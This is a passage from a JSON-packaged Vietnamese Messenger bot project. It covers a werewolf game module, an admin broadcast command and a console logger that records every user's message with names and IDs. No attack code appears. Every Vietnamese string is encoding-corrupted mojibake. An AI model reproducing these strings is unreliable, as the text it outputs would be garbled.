Thu·ªôc V·ªÅ D√¢n L√†ng !!!',event.threadID);\n      var values = Data.get(event.threadID);\n      var All = values.player;\n      var Objection = '';\n      for (let i of All) {\n        var name = (await api.getUserInfoV5(i.id))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(i.id);\n        Objection += 'T√™n: ' + name + '\\x0aRole: ' + i['vai'] + '\\x0aUID: ' + i['id'] + '\\x0aFacebook: Facebook.com/' + i['id'] + '\\x0a\\x0a';\n      }\n      global.moduleData.werewolf = new Map();\n      return api.sendMessage('‚ûú T·ªïng Ng√†y Tr√¥i Qua: ' + Days + '\\x0aT·ªïng Ng∆∞·ªùi C√≤n S·ªëng: ' + All['length'] + '\\x0a\\x0a' + Objection,event.threadID);\n    }\n    case \"Werewolf\": {\n      api.sendMessage('‚ûú Ch√∫c M·ª´ng S√≥i ƒê√£ Ti√™u Di·ªát ƒê∆∞·ª£c T·∫•t C·∫£ D√¢n L√†ng ! V√† Ph·∫ßn Th·∫Øng Thu·ªôc V·ªÅ S√≥i !!!',event.threadID);\n      var values = Data.get(event.threadID);\n      var All = values.player;\n      var Objection = '';\n      for (let i of All) {\n        var name = (await api.getUserInfoV5(i.id))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(i.id);\n        Objection += 'T√™n: ' + name + '\\x0aRole: ' + i['vai'] + '\\x0aUID: ' + i['id'] + '\\x0aFacebook: Facebook.com/' + i['id'] + '\\x0a\\x0a';\n      }\n      global.moduleData.werewolf = new Map();\n      return api.sendMessage('‚ûú T·ªïng Ng√†y Tr√¥i Qua: ' + Days + '\\x0aT·ªïng Ng∆∞·ªùi C√≤n S·ªëng: ' + All['length'] + '\\x0a\\x0a' + Objection,event.threadID);\n    }\n  }\n}\n\nmodule.exports.Logic_Sort = async function(api, event, Users,Data, TeamSoi) {\n  //V·ªÅ Ph·∫ßn Respone cho s√≥i khi h·∫øt time\n  if (Global_ArrayChoose.MaSoi.hasOwnProperty(Global_ArrayChoose.BaoVe[0])) {\n    if (Object.keys(Global_ArrayChoose.MaSoi).length == 2) {\n      var RandomTarget = Object.keys(Global_ArrayChoose.MaSoi)[Math.floor(Math.random() * Object.keys(Global_ArrayChoose.MaSoi).length)];\n      var name = (await api.getUserInfoV5(RandomTarget))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(RandomTarget);\n      for (let i of TeamSoi) {\n        api.sendMessage(`‚ûú V√¨ Kh√¥ng C√πng M·ª•c Ti√™u, N√™n H·ªá Th·ªëng S·∫Ω Random ƒê·ªëi T∆∞·ª£ng M√† 2 B√™n ƒê√£ Ch·ªçn !`,i);\n        api.sendMessage(`‚ûú ƒê·ªëi T∆∞·ª£ng ƒê∆∞·ª£c Ch·ªçn L√†: ${name}`,i);\n      }\n      if (Global_ArrayChoose.MaSoi.hasOwnProperty(Global_ArrayChoose.BaoVe[0])) {\n        var values = Data.get(global.AuthThread)\n        var find = values.player.find(i => i.vai == \"B·∫£o V·ªá\");\n        for (let i of TeamSoi) {\n          api.sendMessage(`‚ûú ${name} ƒê√£ B·ªã B·∫£o V·ªá !`,i, (err,info) => { Global_ArrayChoose.MaSoi = {}; });\n        }\n        api.sendMessage(`‚ûú B·∫°n V·ª´a B·∫£o V·ªá ${name} Th√†nh C√¥ng !`, find.id); \n      }\n      else {\n        for (let i of TeamSoi) {\n          api.sendMessage(`‚ûú ƒê√£ Th·ªß Ti√™u Th√†nh C√¥ng: ${name}`,i, (err,info) => { Global_ArrayChoose.MaSoi = {};});\n        }\n        DataGM.Die = name; \n        var values  = Data.get(global.AuthThread)\n        values.player.splice(values.player.findIndex(i => i.id == RandomTarget),1);\n        return api.sendMessage('‚ûú B·∫°n ƒê√£ B·ªã Ma S√≥i Th·ªß Ti√™u T·ªëi Qua !', RandomTarget);\n      }\n    }\n    else if (Global_ArrayChoose.MaSoi.hasOwnProperty(Global_ArrayChoose.BaoVe[0])) {\n      var values = Data.get(global.AuthThread)\n      var find = values.player.find(i => i.vai == \"B·∫£o V·ªá\");\n      var name = (await api.getUserInfoV5(Global_ArrayChoose.BaoVe[0]))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(Global_ArrayChoose.BaoVe[0]);\n      for (let i of TeamSoi) {\n        api.sendMessage(`‚ûú ${name} ƒê√£ B·ªã B·∫£o V·ªá !`,i, (err,info) => { Global_ArrayChoose.MaSoi = {}; });\n      }\n      api.sendMessage(`‚ûú B·∫°n V·ª´a B·∫£o V·ªá ${name} Th√†nh C√¥ng !`, find.id);\n    }\n  }\n  else {\n    let Values = Data.get(global.AuthThread);\n    let WereWolf = Values.player.filter(i => i.phe == \"Ma S√≥i\");\n    if (Object.keys(Global_ArrayChoose.MaSoi).length == 0 || Object.keys(Global_ArrayChoose.MaSoi).length == 1 && Global_ArrayChoose.MaSoi[Object.keys(Global_ArrayChoose.MaSoi)[0]] < WereWolf.length) {\n      for (let i of TeamSoi) {\n        api.sendMessage(`‚ûú Kh√¥ng C√≥ ƒê·ªëi T∆∞·ª£ng N√†o ƒê∆∞·ª£c Ch·ªçn Ho·∫∑c Kh√¥ng ƒê·ªß Vote !`,i);\n      }\n    }\n    else {\n      if (Object.keys(Global_ArrayChoose.MaSoi).length == 2) {\n        var RandomTarget = Object.keys(Global_ArrayChoose.MaSoi)[Math.floor(Math.random() * Object.keys(Global_ArrayChoose.MaSoi).length)];\n        var name = (await api.getUserInfoV5(RandomTarget))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(RandomTarget);\n        for (let i of TeamSoi) {\n          api.sendMessage(`‚ûú V√¨ Kh√¥ng C√πng M·ª•c Ti√™u, N√™n H·ªá Th·ªëng S·∫Ω Random ƒê·ªëi T∆∞·ª£ng M√† 2 B√™n ƒê√£ Ch·ªçn !`,i);\n          api.sendMessage(`‚ûú ƒê·ªëi T∆∞·ª£ng ƒê∆∞·ª£c Ch·ªçn L√†: ${name}`,i);\n        }\n        if (Global_ArrayChoose.MaSoi.hasOwnProperty(Global_ArrayChoose.BaoVe[0])) {\n          var values = Data.get(global.AuthThread)\n          var find = values.player.find(i => i.vai == \"B·∫£o V·ªá\");\n          for (let i of TeamSoi) {\n            api.sendMessage(`‚ûú ${name} ƒê√£ B·ªã B·∫£o V·ªá !`,i, (err,info) => { Global_ArrayChoose.MaSoi = {}; });\n          }\n          api.sendMessage(`‚ûú B·∫°n V·ª´a B·∫£o V·ªá ${name} Th√†nh C√¥ng !`, find.id); \n        }\n        else {\n          for (let i of TeamSoi) {\n            api.sendMessage(`‚ûú ƒê√£ Th·ªß Ti√™u Th√†nh C√¥ng: ${name}`,i, (err,info) => { Global_ArrayChoose.MaSoi = {};});\n          }\n          DataGM.Die = name; \n          var values  = Data.get(global.AuthThread)\n          values.player.splice(values.player.findIndex(i => i.id == RandomTarget),1);\n          return api.sendMessage('‚ûú B·∫°n ƒê√£ B·ªã Ma S√≥i Th·ªß Ti√™u T·ªëi Qua !', RandomTarget);\n        }\n      } \n      else {\n        var values = Data.get(global.AuthThread)\n        var name = (await api.getUserInfoV5(Object.keys(Global_ArrayChoose.MaSoi)[0]))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(Object.keys(Global_ArrayChoose.MaSoi)[0]);\n        for (let i of TeamSoi) {\n          api.sendMessage(`‚ûú ƒê√£ Th·ªß Ti√™u Th√†nh C√¥ng: ${name}`,i, (err,info) => { Global_ArrayChoose.MaSoi = {};});\n        }\n        DataGM.Die = name; \n        values.player.splice(values.player.findIndex(i => i.id == Object.keys(Global_ArrayChoose.MaSoi)[0]),1);\n        return api.sendMessage('‚ûú B·∫°n ƒê√£ B·ªã Ma S√≥i Th·ªß Ti√™u T·ªëi Qua !', Object.keys(Global_ArrayChoose.MaSoi)[0]);\n      }\n    }\n  }\n  //ti√™n tri\n  if (getType(Global_ArrayChoose.TienTri.Choose) == \"Object\" && Global_ArrayChoose.TienTri.Choose != \"String\") {\n    var name = (await api.getUserInfoV5(Global_ArrayChoose.TienTri.Choose.id))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(Global_ArrayChoose.TienTri.Choose.id);\n    api.sendMessage('‚ûú Ch·ª©c V·ª• C·ªßa ' + name + \" L√†: \" + Global_ArrayChoose.TienTri.Choose.role, Global_ArrayChoose.TienTri.Owner);\n  }\n}\n\nfunction getType(obj) {\n  return Object.prototype.toString.call(obj).slice(8, -1);\n}\n\nasync function start(api,event,Users,Data,TeamSoi) {\n  await new Promise(resolve => setTimeout(resolve, 3*1000));\n    var out = async(msg) => api.sendMessage(\"‚ûú \" + msg,event.threadID);\n  try {\n    out(\"‚ûú M√†n ƒë√™m b·∫Øt ƒë·∫ßu bu√¥ng xu·ªëng !, b√¢y gi·ªù l√† th·ªùi gian c·ªßa s√≥i ho·∫°t ƒë·ªông...\");\n    await module.exports.MaSoiChoose(api, event,Users, Data, TeamSoi);\n    await module.exports.Another_Role_Async(api, event,Users, Data);\n    await new Promise(resolve => setTimeout(resolve, 45*1000));\n    Block_Action = true;\n    await module.exports.Logic_Sort(api, event,Users, Data, TeamSoi);\n    await module.exports.Morning_Time(api, event,Users, Data,TeamSoi);\n  }\n  catch (e) {\n    console.log(e);\n    return out(\"ƒê√£ X·∫£y Ra L·ªói Trong Qu√° Tr√¨nh Th·ª±c Thi Game !\")\n  }\n}\n\nmodule.exports.handleEvent = async function ({ api,event,Users }) {\n  const pathData = join(__dirname,  \"cache\" ,\"werewolf.json\");\n  var dataJson = JSON.parse(readFileSync(pathData, \"utf-8\"));\n  const { senderID, threadID, body, messageID } = event;var Team1 = [],LOI = [];\n    if (!global.moduleData.werewolf) global.moduleData.werewolf = new Map();\n      if (!global.moduleData.werewolf.get(threadID)) return;\n        var values = global.moduleData.werewolf.get(threadID);\n      global.moduleData.werewolf.set(threadID, values);\n    if (values.start != 1) return;\n  var content = body.toUpperCase();\nswitch (content) {\n  case \"CHIA VAI\":\n    case \"CHIAVAI\": {\n      switch (parseInt(values.type)) {\n        case 9: {\n          var role = [\"D√¢n L√†ng\",\"S√≥i th∆∞·ªùng\",\"Ti√™n Tri\",\"B·∫£o V·ªá\",\"S√≥i th∆∞·ªùng\",\"D√¢n L√†ng\",\"D√¢n L√†ng\",\"D√¢n L√†ng\",\"D√¢n L√†ng\"];\n            for (let i = 0;i < values.player.length;i++) {\n              var vai = role[Math.floor(Math.random() * role.length)];\n                var is = dataJson.find(data => data.Name == vai);\n                  values.player[i].vai = is.Name;\n                    values.player[i].phe = is.Type;\n                    role.splice(role.indexOf(vai), 1);  \n                  if (vai == \"S√≥i th∆∞·ªùng\") Team1.push(values.player[i].id);\n                await new Promise(resolve => setTimeout(resolve, 500));\n              api.sendMessage({ body:  '‚ûú Vai Tr√≤ C·ªßa B·∫°n L√†: ' + is['Name'] + '\\x0aChi Ti·∫øt: ' + is['Description'] + '\\x0aThu·ªôc Phe: ' + is['Type'] + ' !',attachment: createReadStream(join(__dirname, is.File))}, values.player[i].id,(ee,inf) => { if (ee) { LOI.push(values.player[i].id);} });\n            }\n          values.phanvai = 1;global.moduleData.werewolf.set(threadID, values);\n            api.sendMessage(\"‚ûú ƒê√£ Ph√¢n Vai Th√†nh C√¥ng !, H√£y Ki·ªÉm Tra Tin Nh·∫Øn Ri√™ng C·ªßa Bot, L∆∞u √ù N·∫øu Acc D∆∞·ªõi 18 Tu·ªïi Kh√¥ng ƒê∆∞·ª£c Tham Gia !\",event.threadID, event.messageID);\n              if (LOI.length != 0) { \n                  for (let love of LOI) {\n                    var name = (await api.getUserInfoV5(love))[0].o0.data.messaging_actors[0].name || (await api.getUserInfoV5(love))[0].o0.data.messaging_actors[0].name;\n                    api.sendMessage(\"‚ûú Check H·ªá Th·ªëng V√† Ph√°t Hi·ªán R·∫±ng Kh√¥ng Th·ªÉ G·ª≠i Tin Nh·∫Øn ƒê·∫øn : \" + name,threadID);\n                  }\n                return api.sendMessage(\"‚ûú Kh√¥ng g·ª≠i ƒê∆∞·ª£c Tin Nh·∫Øn ƒê·ªìng Nghƒ©a Player ƒê√£ Ch·∫∑n Bot Ho·∫∑c Acc D∆∞·ªõi 18+,Game S·∫Ω Kh√¥ng Th·ª±c Hi·ªán ƒê∆∞·ª£c, Ti·∫øn H√†nh Restart Bot, H·ªßy Game Tr√°nh L·ªói ( b·∫•m werewolf help ƒë·ªÉ bi·∫øt chi ti·∫øt )\",threadID, (err, info) => { return process.exit(1); });\n              }\n            if (Team1.length != 0) {\n              try {\n                for (let check of Team1) {\n                  if (check == Team1[0]) {\n                    var name = (await api.getUserInfoV5(Team1[1]))[0].o0.data.messaging_actors[0].name|| (await api.getUserInfoV5(Team1[1]))[0].o0.data.messaging_actors[0].name;\n                    api.sendMessage(\"‚ûú ƒê·ªìng ƒê·ªôi C·ªßa B·∫°n L√† : \" + name + \", ID: \" + Team1[1] + \"\\nH√£y Nh·∫Øn Tin V·ªõi Nhau ƒê·ªÉ H·ª£p T√°c T·ªët Nh·∫•t !\",check);\n                  }\n                  else if (check == Team1[1]) {\n                    var name = (await api.getUserInfoV5(Team1[0]))[0].o0.data.messaging_actors[0].name || (await api.getUserInfo5(Team1[0]))[0].o0.data.messaging_actors[0].name;\n                    api.sendMessage(\"‚ûú ƒê·ªìng ƒê·ªôi C·ªßa B·∫°n L√† : \" + name + \", UID: \" + Team1[0] + \"\\nH√£y Nh·∫Øn Tin V·ªõi Nhau ƒê·ªÉ H·ª£p T√°c T·ªët Nh·∫•t !\",check);\n                  }\n                }\n                return await start(api,event,Users,global.moduleData.werewolf,Team1);\n              }\n              catch (e) { console.log(e); return api.sendMessage('‚ûú ƒê√£ L·ªói !',event.threadID);}\n            }\n          }\n        } \n      };\n    break;\n      case \"TEST\": {\n        var test = [];\n          for (let i = 0;i < values.player.length;i++) {\n            api.sendMessage('‚ûú B·∫°n C√≥ Th·∫•y Tin Nh·∫Øn N√†y ?',values.player[i].id,(error,info) => {if (error) { test.push(values.player[i].id);}});\n          }\n        if (test.length != 0) {\n          for (let kan of test) {\n            var name = (await api.getUserInfoV5(kan))[0].o0.data.messaging_actors[0].name || (await Users.getInfo(kan)).name;\n            api.sendMessage(\"‚ûú Ph√°t Hi·ªán Acc D∆∞·ªõi 18+ Ho·∫∑c ƒê√£ Block Acc Bot\" + \" T·∫°i User: \" + name + \", Ti·∫øn H√†nh Restart Bot, H·ªßy Game Tr√°nh L·ªói,Chi Ti·∫øt T·∫°i werewolf help\",event.threadID);\n          }\n          return process.exit(1);\n        }\n        else return api.sendMessage(\"‚ûú Kh√¥ng Ph√°t Hi·ªán Acc D∆∞·ªõi 18+ Ho·∫∑c ƒê√£ Block Acc Bot\",event.threadID);\n      }\n      break;\n      case \"PING\": {\n        return api.sendMessage(`‚ûú T·ªïng S·ªë Ng∆∞·ªùi Tham Gia: ${values.player.length}, ƒê√£ Chia Phe: ${values.phanvai==1? \"True\": \"False\"}, ƒê√£ Start Game: ${values.start==1?\"True\": \"False\"}`,event.threadID);\n      }\n    default: {}\n  }\n};\n\nmodule.exports.run = async function ({ api, event, args, Users }) {\n  var out = (msg) => api.sendMessage(msg,event.threadID,event.messageID);var { senderID,threadID,messageID } = event;\n    switch (args[0]) {\n      case \"9\": {\n        switch (args[1]) {\n          case \"create\":\n            case \"Create\": {\n              if (!global.moduleData.werewolf) global.moduleData.werewolf = new Map();\n                var values = global.moduleData.werewolf.get(event.threadID) || {};\n                  if (global.moduleData.werewolf.has(event.threadID)) return api.sendMessage(\"‚ûú Nh√≥m ƒëang c√≥ b√†n ma s√≥i !\", threadID, messageID);\n                  global.moduleData.werewolf.set(event.threadID, { author: event.senderID, start: 0, type: '9', phanvai: 0, player: [] });\n                global.AuthThread = event.threadID;\n              return out(\"‚ûú ƒê√£ T·∫°o Th√†nh C√¥ng B√†n C√≥ 8-9 Ng∆∞·ªùi! H√£y b·∫•m masoi join ƒë·ªÉ tham gia !, H∆∞·ªõng D·∫´n T·∫°i masoi help!, L∆∞u √ù Kh√¥ng ƒê∆∞·ª£c Cho Acc D∆∞·ªõi 18 Tu·ªïi ( Facebook ) Ch∆°i V√¨ S·∫Ω L·ªói !\"); \n            }\n          case \"check\":\n            case \"Check\": {\n              var values = global.moduleData.werewolf.get(event.threadID) || {};\n              return out(`‚ûú Status: ${values.player.length}/${values.type}`);\n            }\n        }\n      }\n        break;\n      case \"10-11\": {\n        return out(\"‚ûú Ch∆∞a Ho√†n Th√†nh !\");\n      }\n      case \"12-13\": {\n        return out(\"‚ûú Ch∆∞a Ho√†n Th√†nh !\");\n      } \n      case \"14-15\": {\n        return out(\"‚ûú Ch∆∞a Ho√†n Th√†nh !\");\n      }\n      case \"16-17\": {\n        return out(\"‚ûú Ch∆∞a Ho√†n Th√†nh !\");\n      }\n      case \"18-19\": {\n        return out(\"‚ûú Ch∆∞a Ho√†n Th√†nh !\");\n      }\n      case \"join\":\n        case \"Join\": {\n          var values = global.moduleData.werewolf.get(event.threadID) || {};if (!values.player) return out('T·∫°o Ph√≤ng ƒê√™') ;if (values.player.length >= values.type) return out(\"Ph√≤ng ƒê√£ ƒê·∫ßy !\");\n            if (values.player.find(item => item.id == senderID)) return api.sendMessage(\"‚ûú B·∫°n ƒê√£ Tham Gia R·ªìi !\", event.threadID, event.messageID);\n              if (!values) return api.sendMessage(\"‚ûú Hi·ªán T·∫°i Ch∆∞a C√≥ V√°n Ma S√≥i N√†o ƒê∆∞·ª£c M·ªü!\", event.threadID, event.messageID);\n                if (values.start == 1) return api.sendMessage(\"‚ûú Chin Nh·ªói Nh∆∞ng V√°n Ma S√≥i C·ªßa Nh√≥m N√†y ƒê√£ Start !\", threadID, messageID);\n              values.player.push({ \"id\": senderID, \"vai\": 0, \"phe\": 0,\"ready\": false, \"vote\": 0 });\n            global.moduleData.werewolf.set(threadID, values);\n          return api.sendMessage(`‚ûú Status: ${values.player.length}/${values.type}`,threadID)\n        }\n      case \"leave\":\n        case \"Leave\": {\n          var values = global.moduleData.werewolf.get(event.threadID) || {};\n            if (typeof values.player == \"undefined\") return api.sendMessage(\"‚ûú H√£y T·∫°o V√°n Ma S√≥i B·∫±ng L·ªánh masoi s·ªë ng∆∞·ªùi tham gia :[8-9] Create !\", event.threadID, event.messageID);\n              if (!values.player.some(item => item.id == senderID)) return api.sendMessage(\"‚ûú B·∫°n ch∆∞a tham gia v√†o b√†n ma s√≥i trong nh√≥m n√†y!\", event.threadID, event.messageID);\n                if (values.start == 1) return api.sendMessage(\"‚ûú Chin Nh·ªói Nh∆∞ng V√°n Ma S√≥i C·ªßa Nh√≥m N√†y ƒê√£ Start !\", threadID, messageID);\n                  if (values.author == senderID) {\n                    global.moduleData.werewolf.delete(threadID);\n                  api.sendMessage(\"‚ûú Ch·ªß Game ƒê√£ R·ªùi Kh·ªèi Game = H·ªßy !\", threadID, messageID);\n                }\n              else {\n            values.player.splice(values.player.findIndex(item => item.id === senderID), 1);\n          api.sendMessage(\"‚ûú B·∫°n ƒê√£ R·ªùi Kh·ªèi Ma S√≥i Th√†nh C√¥ng !\", threadID, messageID);\n        global.moduleData.werewolf.set(threadID, values);\n      }\n        }\n          break;\n      case 'status':\n        case \"Status\": {\n          var values = global.moduleData.werewolf.get(event.threadID) || {};\n            if (typeof values.player == \"undefined\") return api.sendMessage(\"‚ûú H√£y T·∫°o V√°n Ma S√≥i B·∫±ng L·ªánh masoi s·ªë ng∆∞·ªùi tham gia :[8-9] Create !\", event.threadID, event.messageID); \n            var name = (await Users.getData(values.author)).name || (await Users.getNameUser(values.author));\n          return out('‚óÜ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ[\\x20üêß\\x20Status\\x20WereWolf\\x20üêß\\x20]‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚óÜ\\x0a[üêß]‚ûú\\x20=>\\x20Ch·ªß\\x20Game:\\x20' + name + '\\x0a[üêß]‚ûú\\x20=>\\x20Lo·∫°i\\x20B√†n\\x20:\\x20' + values['type'] + '\\x20Player\\x0a[üêß]‚ûú\\x20=>\\x20S·ªë\\x20Ng∆∞·ªùi\\x20Tham\\x20Gia:\\x20' + values['player']['length'] + '/' + values['type']);\n        }\n      case 'start':\n        case 'Start': {\n          var values = global.moduleData.werewolf.get(event.threadID) || {}; \n            if (!values) return api.sendMessage(\"‚ûú Hi·ªán T·∫°i Ch∆∞a C√≥ V√°n Ma S√≥i N√†o ƒê∆∞·ª£c M·ªü!\", event.threadID, event.messageID);\n              if (senderID == values.author) {\n                if (values.player.length <= 1 || values.player.length != values.type) return api.sendMessage(`‚ûú ƒêang Thi·∫øu Ng∆∞·ªùi, Hi·ªán T·∫°i C√≥ : ${values.player.length}/${values.type} Ng∆∞·ªùi !`, threadID, messageID);\n              if (values.start == 1) return api.sendMessage(\"‚ûú ƒê√£ B·∫Øt ƒê·∫ßu R·ªìi !\", threadID, messageID);\n            values.start = 1;\n          return out(\"‚ûú B·∫Øt ƒê·∫ßu Th√†nh C√¥ng!\");\n        }\n      }\n        break;\n      case \"help\":\n        case \"Help\": return out(`=== H∆∞·ªõng D·∫´n Ch∆°i ===\\n\\n‚Üí C√°c Lo·∫°i: ${global.config.PREFIX}${this.config.name} [9 / status / leave / join]\\n‚Üí T·∫°o B√†n: ${global.config.PREFIX}${this.config.name} 9 create\\n‚Üí Ki·ªÉm Tra: ${global.config.PREFIX}${this.config.name} 9 check\\n‚Üí R·ªùi B√†n: ${global.config.PREFIX}${this.config.name} leave\\n‚Üí Tham Gia: ${global.config.PREFIX}${this.config.name} join\\n‚Üí B·∫Øt ƒê·∫ßu: ${global.config.PREFIX}${this.config.name} start\\n‚Üí L∆∞u √ù: Kh√¥ng ƒê∆∞·ª£c Cho Acc D∆∞·ªõi 18 Tu·ªïi ( Facebook ) Ch∆°i V√¨ S·∫Ω L·ªói !`);\n    default: return out(`=== H∆∞·ªõng D·∫´n Ch∆°i ===\\n\\n‚Üí C√°c Lo·∫°i: ${global.config.PREFIX}${this.config.name} [9 / status / leave / join]\\n‚Üí T·∫°o B√†n: ${global.config.PREFIX}${this.config.name} 9 create\\n‚Üí Ki·ªÉm Tra: ${global.config.PREFIX}${this.config.name} 9 check\\n‚Üí R·ªùi B√†n: ${global.config.PREFIX}${this.config.name} leave\\n‚Üí Tham Gia: ${global.config.PREFIX}${this.config.name} join\\n‚Üí B·∫Øt ƒê·∫ßu: ${global.config.PREFIX}${this.config.name} start\\n‚Üí L∆∞u √ù: Kh√¥ng ƒê∆∞·ª£c Cho Acc D∆∞·ªõi 18 Tu·ªïi ( Facebook ) Ch∆°i V√¨ S·∫Ω L·ªói !`);\n  }\n};\n","path":null,"size_bytes":38962,"size_tokens":null},"modules/commands/noti.js":{"content":"const fs = require('fs');\nconst request = require('request');\n\nmodule.exports.config = {\n    name: \"noti\",\n    version: \"1.0.0\",\n    hasPermssion: 3,\n    credits: \"TruongMini\",\n    description: \"Th√¥ng b√°o cho c√°c nh√≥m\",\n    commandCategory: \"H·ªá Th·ªëng\",\n    usages: \"noti [msg]\",\n    cooldowns: 5,\n}\n\nlet atmDir = [];\n\nconst getAtm = (atm, body) => new Promise(async (resolve) => {\n    let msg = {}, attachment = [];\n    msg.body = body;\n    for(let eachAtm of atm) {\n        await new Promise(async (resolve) => {\n            try {\n                let response =  await request.get(eachAtm.url),\n                    pathName = response.uri.pathname,\n                    ext = pathName.substring(pathName.lastIndexOf(\".\") + 1),\n                    path = __dirname + `/cache/${eachAtm.filename}.${ext}`\n                response\n                    .pipe(fs.createWriteStream(path))\n                    .on(\"close\", () => {\n                        attachment.push(fs.createReadStream(path));\n                        atmDir.push(path);\n                        resolve();\n                    })\n            } catch(e) { console.log(e); }\n        })\n    }\n    msg.attachment = attachment;\n    resolve(msg);\n})\n\nmodule.exports.handleReply = async function ({ api, event, handleReply, Users, Threads }) {\n    const { threadID, messageID, senderID, body } = event;\n    let name = await Users.getNameUser(senderID);\n    switch (handleReply.type) {\n        case \"noti\": {\n            let text = `„Äé üìù „Äè N·ªôi dung : ${body}\\n„Äé üå∏ „Äè T·ª´ ${name}  nh√≥m ${(await Threads.getInfo(threadID)).threadName || \"Unknow\"}`;\n            if(event.attachments.length > 0) text = await getAtm(event.attachments, `„Äé üìù „Äè N·ªôi dung: ${body}\\n„Äé üå∏ „Äè T·ª´ ${name} Trong nh√≥m ${(await Threads.getInfo(threadID)).threadName || \"Unknow\"}`);\n            api.sendMessage(text, handleReply.threadID, (err, info) => {\n                atmDir.forEach(each => fs.unlinkSync(each))\n                atmDir = [];\n                global.client.handleReply.push({\n                    name: this.config.name,\n                    type: \"reply\",\n                    messageID: info.messageID,\n                    messID: messageID,\n                    threadID\n                })\n            });\n            break;\n        }\n        case \"reply\": {\n            let text = `„Äé üìù „Äè N·ªôi dung : ${body}\\n„Äé üå∏ „Äè T·ª´ ${name} \\nreply tin nh·∫Øn n√†y ƒë·ªÉ b√°o v·ªÅ admin`;\n            if(event.attachments.length > 0) text = await getAtm(event.attachments, `„Äé ‚ùó „Äè ${body}\\n\\n„Äé üå∏ „Äè From ${name} \\nreply tin nh·∫Øn n√†y ƒë·ªÉ b√°o v·ªÅ admin`);\n            api.sendMessage(text, handleReply.threadID, (err, info) => {\n                atmDir.forEach(each => fs.unlinkSync(each))\n                atmDir = [];\n                global.client.handleReply.push({\n                    name: this.config.name,\n                    type: \"noti\",\n                    messageID: info.messageID,\n                    threadID\n                })\n            }, handleReply.messID);\n            break;\n        }\n    }\n}\n\nmodule.exports.run = async function ({ api, event, args, Users }) {\n    const { threadID, messageID, senderID, messageReply } = event;\n  //if (event.senderID != 100033478361032) return api.sendMessage(`???`, event.threadID, event.messageID)\n    if (!args[0]) return api.sendMessage(\"„Äé üå∏ „Äè Please input message\", threadID);\n    let allThread = global.data.allThreadID || [];\n    let can = 0, canNot = 0;\n    let text = `„Äé üìù „Äè N·ªôi dung : ${args.join(\" \")}\\n„Äé üå∏ „Äè T·ª´ ${await Users.getNameUser(senderID)} \\n[‚ù§Ô∏è] Reply tin nh·∫Øn n√†y ƒë·ªÉ b√°o v·ªÅ admin`;\n    if(event.type == \"message_reply\") text = await getAtm(messageReply.attachments, `„Äé üìù „ÄèN·ªôi dung : ${args.join(\" \")}\\n„Äé üå∏ „Äè T·ª´ ${await Users.getNameUser(senderID)}\\n„Äé ‚ù§Ô∏è „ÄèReply tin nh·∫Øn n√†y ƒë·ªÉ b√°o v·ªÅ admin`);\n    await new Promise(resolve => {\n        allThread.forEach((each) => {\n            try {\n                api.sendMessage(text, each, (err, info) => {\n                    if(err) { canNot++; }\n                    else {\n                        can++;\n                        atmDir.forEach(each => fs.unlinkSync(each))\n                        atmDir = [];\n                        global.client.handleReply.push({\n                            name: this.config.name,\n                            type: \"noti\",\n                            messageID: info.messageID,\n                            messID: messageID,\n                            threadID\n                        })\n                        resolve();\n                    }\n                })\n            } catch(e) { console.log(e) }\n        })\n    })\n    api.sendMessage(`„Äé üå∏ „Äè Send to ${can} thread, not send to ${canNot} thread`, threadID);\n}\n","path":null,"size_bytes":4851,"size_tokens":null},"modules/commands/console.js":{"content":"module.exports.config = {\n  name: \"console\",\n  version: \"1.0.0\",\n  hasPermssion: 3,\n  credits: \"JRT\",\n  description: \"L√†m cho console ƒë·∫πp h∆°n\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  usages: \"console \",\n  cooldowns: 0\n};\nmodule.exports.handleEvent = async function ({ api, args, Users, event, Threads, utils, client }) {\n  let { messageID, threadID, senderID, mentions } = event;\n  const chalk = require('chalk');\n   const moment = require(\"moment-timezone\");\nvar time= moment.tz(\"Asia/Ho_Chi_Minh\").format(\"LLLL\");   \nconst thread = global.data.threadData.get(event.threadID) || {};\nif (typeof thread[\"console\"] !== \"undefined\" && thread[\"console\"] == true) return;\nif (event.senderID == global.data.botID) return;\nvar nameBox = global.data.threadInfo.get(event.threadID).threadName || \"T√™n kh√¥ng t·ªìn t·∫°i\";\nvar nameUser = await Users.getNameUser(event.senderID)\n  var msg = event.body||\"·∫¢nh, video ho·∫∑c k√≠ t·ª± ƒë·∫∑c bi·ªát\";\n  var job = [\"FF9900\", \"FFFF33\", \"33FFFF\", \"FF99FF\", \"FF3366\", \"FFFF66\", \"FF00FF\", \"66FF99\", \"00CCFF\", \"FF0099\", \"FF0066\", \"7900FF\", \"93FFD8\", \"CFFFDC\", \"FF5B00\", \"3B44F6\", \"A6D1E6\", \"7F5283\", \"A66CFF\", \"F05454\", \"FCF8E8\", \"94B49F\", \"47B5FF\", \"B8FFF9\", \"42C2FF\", \"FF7396\"];\n  var random = \njob[Math.floor(Math.random() * job.length)]      \n  var random1 = job[Math.floor(Math.random() * job.length)]\n var random2 = job[Math.floor(Math.random() * job.length)]\nvar random3 = job[Math.floor(Math.random() * job.length)]\nvar random4 = job[Math.floor(Math.random() * job.length)]\nvar random5 = job[Math.floor(Math.random() * job.length)]\nvar random6 = job[Math.floor(Math.random() * job.length)]\n  console.log(chalk.hex(\"#\" + random)(`[üìå]‚Üí T√™n nh√≥m: ${nameBox}`) + `\\n` + chalk.hex(\"#\" + random5)(`[üÜî]‚Üí ID nh√≥m: ${event.threadID}`) + `\\n` + chalk.hex(\"#\" + random6)(`[üí¢]‚Üí T√™n ng∆∞·ªùi d√πng: ${nameUser}`) + `\\n` + chalk.hex(\"#\" + random1)(`[üÜî]‚Üí ID ng∆∞·ªùi d√πng: ${event.senderID}`) + `\\n` + chalk.hex(\"#\" + random2)(`[üí≠]‚Üí N·ªôi dung: ${msg}`) + `\\n` + chalk.hex(\"#\" + random3)(`[ ${time} ]`) + `\\n` + chalk.hex(\"#\" + 